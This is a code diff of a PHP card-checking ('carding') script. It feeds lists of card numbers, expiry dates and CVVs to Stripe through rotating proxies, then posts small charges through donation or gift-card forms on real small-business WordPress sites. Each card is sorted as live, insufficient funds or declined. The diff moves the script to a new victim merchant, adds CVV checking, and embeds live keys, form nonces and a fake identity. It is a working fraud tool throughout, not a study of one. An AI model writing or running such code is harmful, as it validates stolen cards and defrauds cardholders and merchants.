@@ -82,7 +82,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=043756e9-e85e-474e-bafc-ec8b90b5b100f6fb78&sid=02596579-0653-4ffe-b811-f136932ade5c1e75c2&pasted_fields=number&payment_user_agent=stripe.js%2F569a682bb6%3B+stripe-js-v3%2F569a682bb6%3B+card-element&referrer=https%3A%2F%2Fwww.simplycleandiaperservice.com&time_on_page=37106&key=pk_live_51LK6MYJNk2Vsl6q9R5uaoX8mKsC2vSopWsgjOMDhkOnn0DqmCKlWoGWm82xtw2f8B2eHFzVrqQ2sxMb4Wu74S92p00ORc8AZSz');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=58944b83-940f-434f-aa2d-18bebf226605ea4e98&sid=9b61583e-db16-404a-95e0-38b2e29e8074d026b2&pasted_fields=number&payment_user_agent=stripe.js%2F737366135d%3B+stripe-js-v3%2F737366135d%3B+card-element&referrer=https%3A%2F%2Fmackenthuns.com&time_on_page=102020&key=pk_live_42NAQdWsJvsYYuNdjfeIiPi3SHHkzUVMTFavfvAQT60ZIMUEa6s12SNesga9nDNoikbDJt9h9en9fLFfvAjB0EAIJ009IitWhj9');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -95,7 +95,7 @@ $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.simplycleandiaperservice.com/wp-admin/admin-ajax.php?t=1713311527515');
+curl_setopt($ch, CURLOPT_URL, 'https://mackenthuns.com/wp-admin/admin-ajax.php?t=1713420038247');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +110,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1713311527515 h2',
-'Host: www.simplycleandiaperservice.com',
+'POST /wp-admin/admin-ajax.php?t=1713420038247 h2',
+'Host: mackenthuns.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://www.simplycleandiaperservice.com',
+'origin: https://mackenthuns.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://www.simplycleandiaperservice.com/one-time-service/',
+'referer: https://mackenthuns.com/gift-card/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D5410%26_fluentform_10_fluentformnonce%3D187a1a6585%26_wp_http_referer%3D%252Fgift-registry%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26input_radio%3DAnonymous%2520Scholarship%2520donation%26custom-payment-amount%3D10%26description%3D%26payment_method%3Dstripe%26__entry_intermediate_hash%3D2d2816ec311d2f2edcf07cc32c705135%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=10');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D10027%26_fluentform_9_fluentformnonce%3D884ccc8b3e%26_wp_http_referer%3D%252Fgift-card%252F%26payment_input%3D25%26item-quantity%3D%26payment_input_1%3D50%26item-quantity_1%3D%26payment_input_2%3D100%26item-quantity_2%3D%26payment_input_3%3D2.99%26dropdown%3DMinnetrista%26input_text%3DGloo%26input_text_1%3DSmoke%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26description%3D%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dgloosmoke%2540gmail.com%26phone%3D%26payment_method%3Dstripe%26__entry_intermediate_hash%3D55fe9585c3fdb1d2f87fa81489e7192d%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=9');
 
 $result2a = curl_exec($ch);
 $dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
@@ -147,9 +147,9 @@ elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insuffi
 $response = "INSUFFICIENT FUNDS ✅";
 
   }
-elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
+elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "security code is incorrect."))){
   $status = "Live 🟡";
-$response = "CCN Live ❎";
+$response = "CCN Live ✅";
 
   }
 elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
@@ -196,9 +196,9 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'Thank you for your order')){
+elseif (strpos($result2a, 'Thank you for your message.')){
   $status = "Live 🟢";
-$response = "Charged 1$ ✅";
+$response = "CVV 3$ ✅";
 
   }
 
@@ -256,7 +256,7 @@ $fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
 Result - '.$response.'</b>
 
 ';
-$umass = "<b>𒀭  MASS CCN CHARGE 1 $  𒀭
+$umass = "<b>𒀭  MASS STRIPE AUTH 3$  𒀭
    ━━━━━━━━━━━━━</b>
 ";
 $fmass = "<b>╭───────────────
